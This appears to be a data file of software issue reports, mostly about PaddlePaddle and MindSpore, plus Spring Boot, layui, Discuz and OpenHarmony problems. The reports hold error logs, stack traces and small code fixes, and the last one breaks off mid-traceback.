ERNIE app does not run under paddlepaddle/develop branch,"Application: https://github.com/PaddlePaddle/benchmark/blob/master/Inference/c%2B%2B/ernie/run.sh does not run under https://github.com/PaddlePaddle/Paddle/tree/develop RUN command ERROR output: BUT On the same machine and the same system (Ubuntu18) runs properly for PP Rel 2.0   <code>: cd /benchmark/Inference/c++/ernie KMP_AFFINITY=granularity=fine,compact,1,0 KMP_BLOCKTIME=1 ./run.sh -1 20 /data/PaddlePaddle/trained_models/ERNIE/ernie_fp32_model /data/PaddlePaddle/datasets/ernie/Ernie_dataset/1.8w.bs1 + gpu_id=-1 + '[' 4 -ge 1 ']' + gpu_id=-1 + num_threads=1 + '[' 4 -ge 2 ']' + num_threads=1 + '[' -1 -eq -1 ']' + USE_GPU=false + export CUDA_VISIBLE_DEVICES= + CUDA_VISIBLE_DEVICES= + MODEL_DIR=/work/inference/ernie/model + DATA_FILE=/work/inference/ernie/seq128_data/test_ds + REPEAT=1 + '[' 4 -ge 3 ']' + MODEL_DIR=/data/PaddlePaddle/trained_models/ERNIE/ernie_int8 + '[' 4 -ge 4 ']' + DATA_FILE=/data/PaddlePaddle/datasets/ernie/Ernie_dataset/1.8w.bs1 + profile=false + '[' 4 -ge 5 ']' + print_outputs=false + '[' 4 -ge 6 ']' + ./build/inference --logtostderr --model_dir=/data/PaddlePaddle/trained_models/ERNIE/ernie_int8 --data=/data/PaddlePaddle/datasets/ernie/Ernie_dataset/1.8w.bs1 --repeat=1 --warmup_steps=1 --use_gpu=false --num_threads=1 --use_analysis=true --print_outputs=false --profile=false ERROR: unknown command line flag 'logtostderr'"
test_analyzer_int8_mobilenet timeout,http://ci.paddlepaddle.org/viewLog.html?buildId=77536&amp;tab=buildLog&amp;buildTypeId=Paddle_PrCi&amp;logTab=tree&amp;filter=all&amp;_focus=19228 Each unit-test have only 1200s limits.   <code>: [08:35:28]The following tests FAILED: [08:35:28] 165 - test_analyzer_int8_mobilenet (Timeout)
profiler的代码示例跑不通,问题来源 @lanxianghit 运行profiler的代码示例，出现   <code>: pip install paddlepaddle-gpu
【论文复现】MaxUnpool2d方法的组合实现代码有bug,代码问题描述： MaxUnpool2d示例代码跑不通 MaxUnpool2d方法链接 采用示例测试反池化时会报错 AttributeError: 'Tensor' object has no attribute 'tolist' 经过调试将forward函数中最后一个for循环进行修改可以跑通： 原始： 修改后： Describe the problem： code for MaxUnpool2d cannot work well. MaxUnpool2d method link There is a bug as follows when running the test. AttributeError: 'Tensor' object has no attribute 'tolist' Modify the last for loop in the forward function to run through: Original： Modified：   <code>: for i in range(flatten_indices.shape[0]): flatten_out[flatten_indices[i].tolist()] = flatten_input[i].tolist() for i in range(flatten_indices.shape[0]): index = int(flatten_indices[i]) flatten_out[index] = flatten_input[i] for i in range(flatten_indices.shape[0]): flatten_out[flatten_indices[i].tolist()] = flatten_input[i].tolist() for i in range(flatten_indices.shape[0]): index = int(flatten_indices[i]) flatten_out[index] = flatten_input[i]
官网自定义算子参考文档有误,"issue：官方自定义算子参考文档有误 文档链接：https://www.mindspore.cn/docs/api/zh-CN/r1.5/_modules/mindspore/ops/primitive.html#prim_attr_register 错误发现时间：2021/12/26 20:17   <code>: [mindspore\core\utils\check_convert_utils.cc:367 CheckInteger] The primitive[ZerosLike]'s input number must be equal to 1, but got 0. zeros_like = ops.ZerosLike()"
Neural Machine Translation demo,"First version of neural machine translation dynamic recurrent operator with beam search @superjom doing @Xreki @guoshengCS @Yancey and @ luotao doing ( ) @qingqing01 (dense table) (maybe just a python function based on fc) seq_softmax @Xreki scale (element-wise mul op) @gongweibao seq_expand @王浩爽 (doing, https://github.com/PaddlePaddle/Paddle/pull/4740)   <code>: fc simple_gru concat first_seq last_seq embedding lookup simple_attention"
在spring boot2.0.1中集成ApiBoot Logging，出现的启动错误,"我直接添加ApiBoot Logging的依赖，启动的时候报的错误如下： 我试过单独建一个新的springboot2.1.6的空项目，启动是没有问题的，我对比了一下，像是springboot版本导致的。 感谢！   <code>: 10:16:58 [localhost-startStop-1] ERROR o.a.c.c.C.[Tomcat].[localhost].[/] - Exception starting filter [apiBootLoggingFilter] java.lang.AbstractMethodError: null at org.apache.catalina.core.ApplicationFilterConfig.initFilter(ApplicationFilterConfig.java:285) at org.apache.catalina.core.ApplicationFilterConfig.&lt;init&gt;(ApplicationFilterConfig.java:112) at org.apache.catalina.core.StandardContext.filterStart(StandardContext.java:4598) at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5241) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1421) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1411) at java.util.concurrent.FutureTask.run$$$capture(FutureTask.java:266) at java.util.concurrent.FutureTask.run(FutureTask.java) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] ERROR o.a.catalina.core.StandardContext - One or more Filters failed to start. Full details will be found in the appropriate container log file 10:16:58 [localhost-startStop-1] ERROR o.a.catalina.core.StandardContext - Context [] startup failed due to previous errors 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][[timer]]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: java.lang.Thread.sleep(Native Method) org.elasticsearch.threadpool.ThreadPool$CachedTimeThread.run(ThreadPool.java:541) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][scheduler][T#1]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.misc.Unsafe.park(Native Method) java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215) java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078) java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093) java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809) java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][transport_client_boss][T#1]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method) sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296) sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278) sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159) sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:886) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][generic][T#1]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.misc.Unsafe.park(Native Method) java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) java.util.concurrent.LinkedTransferQueue.awaitMatch(LinkedTransferQueue.java:737) java.util.concurrent.LinkedTransferQueue.xfer(LinkedTransferQueue.java:647) java.util.concurrent.LinkedTransferQueue.take(LinkedTransferQueue.java:1269) java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][transport_client_boss][T#2]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method) sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296) sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278) sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159) sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:886) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][transport_client_boss][T#3]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method) sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296) sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278) sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159) sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:886) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][transport_client_boss][T#4]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method) sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296) sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278) sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159) sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:886) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][transport_client_boss][T#5]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method) sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296) sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278) sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159) sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:886) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][transport_client_boss][T#6]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method) sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296) sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278) sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159) sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:886) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][transport_client_boss][T#7]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method) sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296) sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278) sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159) sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:886) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][transport_client_boss][T#8]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method) sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296) sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278) sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159) sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86) sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97) io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:753) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:409) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:886) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][generic][T#2]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.misc.Unsafe.park(Native Method) java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) java.util.concurrent.LinkedTransferQueue.awaitMatch(LinkedTransferQueue.java:737) java.util.concurrent.LinkedTransferQueue.xfer(LinkedTransferQueue.java:647) java.util.concurrent.LinkedTransferQueue.take(LinkedTransferQueue.java:1269) java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][generic][T#3]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.misc.Unsafe.park(Native Method) java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) java.util.concurrent.LinkedTransferQueue.awaitMatch(LinkedTransferQueue.java:737) java.util.concurrent.LinkedTransferQueue.xfer(LinkedTransferQueue.java:647) java.util.concurrent.LinkedTransferQueue.take(LinkedTransferQueue.java:1269) java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) java.lang.Thread.run(Thread.java:748) 10:16:58 [localhost-startStop-1] WARN o.a.c.loader.WebappClassLoaderBase - The web application [ROOT] appears to have started a thread named [elasticsearch[_client_][generic][T#4]] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.misc.Unsafe.park(Native Method) java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) java.util.concurrent.LinkedTransferQueue.awaitMatch(LinkedTransferQueue.java:737) java.util.concurrent.LinkedTransferQueue.xfer(LinkedTransferQueue.java:647) java.util.concurrent.LinkedTransferQueue.take(LinkedTransferQueue.java:1269) java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1074) java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1134) java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) java.lang.Thread.run(Thread.java:748) 10:16:59 [main] INFO o.a.coyote.http11.Http11NioProtocol - Starting ProtocolHandler [""http-nio-9099""] 10:16:59 [main] INFO o.a.tomcat.util.net.NioSelectorPool - Using a shared selector for servlet write/read 10:16:59 [main] INFO o.a.coyote.http11.Http11NioProtocol - Pausing ProtocolHandler [""http-nio-9099""] 10:16:59 [main] INFO o.a.catalina.core.StandardService - Stopping service [Tomcat] 10:16:59 [main] INFO o.a.coyote.http11.Http11NioProtocol - Stopping ProtocolHandler [""http-nio-9099""] 10:16:59 [main] WARN o.s.b.w.s.c.AnnotationConfigServletWebServerApplicationContext - Exception encountered during context initialization - cancelling refresh attempt: org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is org.springframework.boot.web.server.WebServerException: Unable to start embedded Tomcat 10:16:59 [main] INFO o.s.s.c.ThreadPoolTaskScheduler - Shutting down ExecutorService 'taskScheduler' 10:16:59 [main] INFO c.alibaba.druid.pool.DruidDataSource - {dataSource-0} closing ... 10:16:59 [main] INFO c.alibaba.druid.pool.DruidDataSource - {dataSource-0} closing ... 10:16:59 [main] INFO c.alibaba.druid.pool.DruidDataSource - {dataSource-0} closing ... 10:16:59 [main] INFO o.s.b.a.l.ConditionEvaluationReportLoggingListener - Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 10:16:59 [main] ERROR o.s.boot.SpringApplication - Application run failed org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is org.springframework.boot.web.server.WebServerException: Unable to start embedded Tomcat at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:155) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:544) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:140) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:759) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:395) at org.springframework.boot.SpringApplication.run(SpringApplication.java:327) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1255) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1243) at com.base.web.BaseMainApp.main(BaseMainApp.java:36) Caused by: org.springframework.boot.web.server.WebServerException: Unable to start embedded Tomcat at org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:126) at org.springframework.boot.web.embedded.tomcat.TomcatWebServer.&lt;init&gt;(TomcatWebServer.java:86) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.getTomcatWebServer(TomcatServletWebServerFactory.java:409) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.getWebServer(TomcatServletWebServerFactory.java:174) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.createWebServer(ServletWebServerApplicationContext.java:179) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:152) ... 8 common frames omitted Caused by: java.lang.IllegalStateException: StandardEngine[Tomcat].StandardHost[localhost].TomcatEmbeddedContext[] failed to start at org.springframework.boot.web.embedded.tomcat.TomcatWebServer.rethrowDeferredStartupExceptions(TomcatWebServer.java:172) at org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:110) ... 13 common frames omitted Disconnected from the target VM, address: '127.0.0.1:64448', transport: 'socket'"
【众智】【计算-GPU开发】TriuIndices,"返回triu元素的indices，dim*N的上三角索引数组 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py class TriuIndices(Primitive): row int 属性 col int 属性 offset int 属性 dtype mstype.dtype 属性 y 对应底层算子 对应底层算子TriuIndices 对标接口参考 PyTorch1.8.1接口： torch.triu_indices https://pytorch.org/docs/stable/generated/torch.triu_indices.html 3. 异常处理 4. 算子反向 无反向   <code>: ``` REG_OP(TriuIndices) .OUTPUT(y, TensorType::IndexNumberType()) /* ""Result, has targeted element type"" */ .REQUIRED_ATTR(row, Int) .REQUIRED_ATTR(col, Int) .ATTR(offset, Int, 0) .ATTR(dtype, Type, DT_INT64) .OP_END_FACTORY_REG(TriuIndices) ```"
问个关于onclick的问题,"如下代码： 我希望在button中增加onclick点击调用这个而方法，因为这样的话，在维护的时候方便一点。 但是在layui中，定义在 layui.use中的方法不是全局的，当然没办法调用。想了这样一个方案 window.getBtnText=function(){}写在layui.use中可以被调用，只是idea展示不出结构。所以有点不喜欢。 当然layui中 可以用 jquery的事件监听，或者 用util，或者放在form中用lay-filter实现。 我想请问，出了上面几个思路实现，有没有更好的方案。   <code>: &lt;button class=""layui-btn"" id=""add"" onclick=""getBtnText();""&gt;新增&lt;/button&gt;"
Check SSE/AVX/AVX2 at runtime  to decline in number of release binaries,"Currently, we have four release binaries, , which looks quite miscellaneous. Actually, we can check CPU capabilities at runtime via query Then, do some bit manipulation to check whether AVX is supported or not. That can help us decline in number of release binaries from four to two. Add SIMD flags source code in #800:fix some dead links in doc/ change macro in current PaddlePaddle to support AVX and SSE at runtime   <code>: no-avx CPU, avx-CPU, no-avx-GPU, avx-GPU. cpuid #ifdef _WIN32 /// MSVC CPUID #define cpuid(info, x) __cpuidex(info, x, 0) #else // GCC Intrinsics #include &lt;cpuid.h&gt; /// gcc / clang CPUID #define cpuid(info, x) __cpuid_count(x, 0, info[0], info[1], info[2], info[3]) #endif paddle/utils #if"
安装过程中在第4步创建数据表卡住，每次卡住位置不同，且都在大约中间位置，且在phpMyAdmin中看不到进程,疑似问题重现步骤 报错信息 为解决问题做过哪些尝试 版本信息 Discuz! 版本: Discuz! X3.5 简体中文 UTF8 版 Release 20221231 Release 版本: 20221231 服务器系统版本: Rocky Linux release 8.7 (Green Obsidian) PHP 版本: 8.1 MySQL / MariaDB 版本: MySQL 5.7.40 内存缓存类型和版本: ? 浏览器类型和版本: Microsoft Edge 108.0.1462.54 (正式版本) (64 位) 是否自行修改过: 否 使用宝塔面板7.9.7 其他信息   <code>: 安装过程中在第4步创建数据表卡住，每次卡住位置不同，且都在大约中间位置，且在phpMyAdmin中看不到进程 直接安装出现 mysql日志： 2023-01-06T02:33:35.431263Z 3027 [Note] Aborted connection 3027 to db: 'discuz' user: 'discuz' host: 'localhost' (Got an error reading communication packets)``` 尝试将/install/data/install.sql 拆为两个文件，但无效 个人判断可能要分两次写入数据库 Nginx、PHP、MySQL的超时时间都修改过，但尝试无效
online表单新增 控制台弹出警告,"版本号： 2.4.5 online表单新增 控制台弹出警告 warning.js?d96e:34 Warning: You cannot set a form field before rendering a field associated with the value. You can use instead to register it before render   <code>: getFieldDecorator(id, options) v-decorator=""[id, options]"""
调试Hi3516提示（no debugging symbols found）,符号表文件我是按照下图设置的？   <code>: Reading symbols from z:/bright/code-1.0/out/ipcamera_hi3516dv300/OHOS_Image... (no debugging symbols found)...done.
[ST][MS][NET][resnet50 imagenet bs=512][pynative][gpu 8p]RuntimeError: Allocate workspace memory failed,"resnet50 imagenet bs=512 在GPU环境pynative模式8p训练，其中一张卡申请内存失败 / 硬件环境: /device GPU : -- MindSpore version :r2.0 commit_id:55a05568 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221204113716 r2.0.0 B060 commit_id:375750d4 (/): /mode pynative test_ms_resnet50_imageent_bs_512_0001.py cd solution_test/cases/02network/00cv/resnet50/pynative pytest -s test_ms_resnet50_imageent_bs_512_0001.py 网络pynative模式bs=512训练成功 走给褚金锦   <code>: epoch: 1 step: 222, loss is 5.5319586 epoch: 1 step: 223, loss is 5.574722 epoch: 1 step: 224, loss is 5.5885577 epoch: 1 step: 225, loss is 5.5458784 epoch: 1 step: 226, loss is 5.5965056 epoch: 1 step: 227, loss is 5.621998 epoch: 1 step: 228, loss is 5.605689 epoch: 1 step: 229, loss is 5.626268 epoch: 1 step: 230, loss is 5.608287 epoch: 1 step: 231, loss is 5.571365 epoch: 1 step: 232, loss is 5.5189753 epoch: 1 step: 233, loss is 5.6353273 epoch: 1 step: 234, loss is 5.499469 epoch: 1 step: 235, loss is 5.62153 [CRITICAL] DEVICE(14641,7fe3d37fe700,python):2022-12-09-10:10:53.237.161 [mindspore/ccsrc/runtime/pynative/run_op_helper.cc:389] CreateKernelWorkspaceAddress] Allocate workspace memory failed [ERROR] DEVICE(14641,7fe3d37fe700,python):2022-12-09-10:10:53.362.714 [mindspore/ccsrc/runtime/pynative/async/async_queue.cc:69] WorkerLoop] Run task failed, error msg:Allocate workspace memory failed ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/runtime/pynative/run_op_helper.cc:389 CreateKernelWorkspaceAddress Traceback (most recent call last): File ""train.py"", line 376, in &lt;module&gt; train_net() File ""/home/jenkins0/solution_test/cases/02network/00cv/resnet50/train/resnet50_imagenet_bs_512_gpu_8p/scripts/train_parallel/src/model_utils/moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 369, in train_net sink_size=500, dataset_sink_mode=dataset_sink_mode) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/train/model.py"", line 1052, in train initial_epoch=initial_epoch) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/train/model.py"", line 614, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/train/model.py"", line 692, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 651, in __call__ raise err File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in __call__ output = self._run_construct(args, kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 413, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 101, in construct return self.network(*outputs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 651, in __call__ raise err File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in __call__ output = self._run_construct(args, kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 413, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py"", line 380, in construct loss = self.network(*inputs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 651, in __call__ raise err File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in __call__ output = self._run_construct(args, kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 413, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/train/amp.py"", line 344, in construct out = self._backbone(data) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 651, in __call__ raise err File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in __call__ output = self._run_construct(args, kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 413, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/jenkins0/solution_test/cases/02network/00cv/resnet50/train/resnet50_imagenet_bs_512_gpu_8p/scripts/train_parallel/src/resnet.py"", line 491, in construct c4 = self.layer3(c3) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 651, in __call__ raise err File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in __call__ output = self._run_construct(args, kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 413, in _run_construct output = self.construct(*cast_inputs, **kwargs) File 